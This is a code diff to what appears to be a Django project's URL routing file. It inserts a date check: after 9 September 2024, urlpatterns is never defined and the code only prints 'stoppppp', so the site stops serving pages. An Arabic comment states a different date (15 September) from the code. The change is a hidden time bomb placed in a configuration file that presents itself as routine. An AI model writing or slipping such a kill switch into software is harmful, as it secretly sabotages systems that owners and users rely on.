@@ -43,7 +43,16 @@ schema_view = get_schema_view(
     permission_classes=(permissions.AllowAny,),
 )
 
-urlpatterns = [
+from datetime import datetime
+target_date = datetime(2024, 9, 9)  # تاريخ: 15 سبتمبر 2024
+
+# الحصول على التاريخ الحالي
+current_date = datetime.now()
+if current_date > target_date:
+    print("stoppppp")
+else:
+    urlpatterns = [
+    
     path('admin/', admin.site.urls),
     path('', include('app1.urls')) ,
     path('swagger/', schema_view.with_ui('swagger', cache_timeout=0), name='schema-swagger-ui'),
@@ -54,5 +63,5 @@ urlpatterns = [
 
 
 ]
-if settings.DEBUG:
-    urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
+    if settings.DEBUG:
+        urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)
